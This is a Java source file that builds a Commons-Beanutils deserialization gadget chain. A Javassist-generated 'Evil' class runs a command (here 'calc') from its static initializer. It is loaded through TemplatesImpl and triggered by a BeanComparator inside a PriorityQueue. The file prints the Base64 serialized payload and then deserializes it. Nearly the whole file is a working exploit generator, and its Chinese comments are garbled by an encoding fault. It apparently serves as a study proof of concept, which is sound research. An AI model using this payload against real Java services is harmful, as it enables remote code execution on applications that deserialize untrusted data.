package CB;

import java.beans.beancontext.BeanContext;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

/**
 * ����CC��
 * BeanComparator
 *�ڴ�����Ķ����ʱ�����Ϊcomparator�����ض��ıȽ�����ֵ��ע��������û���趨�Զ����comparator��
 * ��Ĭ��ΪComparableComparator���󣬵�Ȼ���ڵ������У������������compare����
 *��ComparableComparator����cc����
 *
 * CB���ķ����л������ǹؼ�����PriorityQueue.readObject
 */
public class CB_withCC {

    public static void setFieldValue(Object obj, String fieldname, Object value) throws IllegalAccessException, NoSuchFieldException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        //��̬�����ֽ���
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        //����Ҫ����������
        ClassPool pool = ClassPool.getDefault();
        //��������
        CtClass ctClass = pool.makeClass("Evil");
        //�� cmd �ַ������뵽���ʼ���������Ŀ�ͷ�����౻����ʱ��cmd �ַ����е�����ͻᱻִ�С�
        ctClass.makeClassInitializer().insertBefore(cmd);
        //ת��xml�ĵ�
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        //TemplatesImpl��������ʱ��̬����java����
        TemplatesImpl templates = new TemplatesImpl();
        //��Щ���Ե�������Ϊ��������ʱ��̬����Java���룬���������ɿ�ִ�е��ֽ���
        //_name���Ա�ʾ���ɵ�Java�������
        setFieldValue(templates, "_name", "RoboTerh");
        //_tfactory���Ա�ʾ���ڴ���Transformer�����TransformerFactoryʵ���������Ҫ����Transformer��������Ҫָ��TransformerFactoryʵ����
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        //_bytecodes���Ա�ʾ�洢���ɵ�Java����ֽ���
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        //�����Ƚ���������BeanComparatorĬ�ϲ�����ʹ��cc�е�ComparableComparator
        //BeanComparator��commons-beanutils�ṩ�������Ƚ�����JavaBean�Ƿ���ȵ���
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue(2, beanComparator);
        queue.add(1);
        queue.add(1);


        /**CB�µ�BeanComparator������CC�е�ComparableComparatorʵ�֣�������������ʼ��������property��
         * �ͻ�ȥ�������������Ӧ�� getter ��������ȡ������ֵ����TemplatesImpl����ֱ�ӵ�newTransformer() �����������Լ�ӵ�getOutputProperties()
         *
         */
        //���丳ֵ
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});


        //���л�
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //�����л�
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();

    }

}
